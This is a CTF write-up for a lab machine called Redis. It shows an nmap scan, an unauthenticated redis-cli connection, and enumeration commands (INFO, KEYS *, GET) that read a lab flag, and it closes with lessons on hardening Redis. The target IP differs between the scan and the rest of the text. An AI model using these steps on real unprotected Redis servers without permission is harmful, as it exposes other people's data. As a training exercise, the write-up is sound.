# Redis — CTF Write-up

## Target Information

| Information | Details | 
| ----- | ----- | 
| **Target IP** | `10.129.222.222` | 
| **Operating System** | Linux 5.4.0-77-generic x86_64 | 

---

## Enumeration

### Nmap Scan

The initial step was to perform a TCP port scan with service/version detection enabled:

```bash
nmap -sC -sV -p- --min-rate 5000 -Pn 10.129.212.60
```

### Scan Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-18 21:07 +0100
Warning: 10.129.212.60 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.129.212.60
Host is up (0.17s latency).
Not shown: 65304 closed tcp ports (reset), 230 filtered tcp ports (no-response)

PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7

Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 44.89 seconds
```

### Findings

Only one TCP port was identified as open:

* **Port 6379/tcp** → **Redis key-value store 5.0.7**

### Redis Service Overview

Redis (Remote Dictionary Server) is an open-source, in-memory NoSQL key-value data store, commonly utilized as a cache, database, or message broker.

---

## Exploitation

### Unauthenticated Access Testing

To verify if authentication was enforced on the Redis server, a connection attempt was made using `redis-cli`:

```bash
redis-cli -h 10.129.222.222
```

Prompt output:

```text
10.129.222.222:6379>
```

The connection succeeded without requiring password authentication, granting unauthenticated administrative access to the database.

---

### Database Enumeration & Server Info

Useful Redis enumeration commands:

```text
INFO            → Returns general server information
INFO keyspace   → Lists active databases and key counts
SELECT <index>  → Switches to the specified database index
KEYS *          → Retrieves all stored keys in the active database
GET <key>       → Reads string value associated with a key
HGETALL <key>   → Retrieves all fields and values from a hash key
```

Checking full server diagnostics:

```text
10.129.222.222:6379> INFO
```

Output:

```text
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

---

### Key Retrieval & Flag Extraction

Checking available databases:

```text
10.129.222.222:6379> INFO keyspace
# Keyspace
db0:keys=4,expires=0,avg_ttl=0
```

Selecting database index `0`:

```text
10.129.222.222:6379> SELECT 0
OK
```

Listing all stored keys in `db0`:

```text
10.129.222.222:6379> KEYS *
1) "temp"
2) "numb"
3) "flag"
4) "stor"
```

Reading the value stored inside the `flag` key:

```text
10.129.222.222:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
```

---

## Flags

### Flag

```text
03e1d2b376c37ab3f5319922053953eb
```

---

## Lessons Learned

1. **Secure Redis Configurations:** Redis instances should never be exposed publicly without strict authentication (`requirepass` directive in `redis.conf`).
2. **Bind Address Restrictions:** Redis should ideally listen on localhost (`127.0.0.1`) unless explicitly configured to communicate securely over private network interfaces using TLS/authentication.
3. **In-Memory Sensitive Data:** Unprotected in-memory databases can expose critical session state, cleartext credentials, or flags to any unauthenticated attacker on port 6379.

---

## Attack Chain Summary

```text
Port 6379 Discovery
  │
  └── Nmap Scan
          │
          ↓
  Redis Service 5.0.7 Detected
          │
          ↓
  Connect via redis-cli
          │
          ↓
  Unauthenticated Access Granted
          │
          ↓
  INFO keyspace (Located db0)
          │
          ↓
  SELECT 0 -> KEYS *
          │
          ↓
  GET flag
          │
          ↓
  Flag Retrieved
```
